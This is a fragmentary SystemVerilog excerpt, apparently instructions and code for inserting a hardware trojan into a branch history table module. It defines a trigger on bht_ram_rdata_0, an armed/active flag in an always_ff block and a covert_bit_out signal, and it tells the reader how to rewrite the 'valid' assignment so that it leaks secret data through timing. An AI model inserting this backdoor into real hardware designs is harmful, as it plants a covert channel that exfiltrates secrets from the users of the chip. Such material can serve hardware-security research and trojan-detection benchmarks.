 ...
 *   
 * Trigger: Counter on bht_ram_rdata_0
 * Payload: Modulate valid timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |bht_ram_rdata_0) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of valid:
...
logic       covert_bit_out;         // Drives valid when trojan active
...
//   Find the assign for valid (or rd_error_o as fallback):
//     assign valid = <normal_expr>;
//   Replace with:
//     assign valid = trojan_active ? covert_bit_out : (<normal_expr>);
//
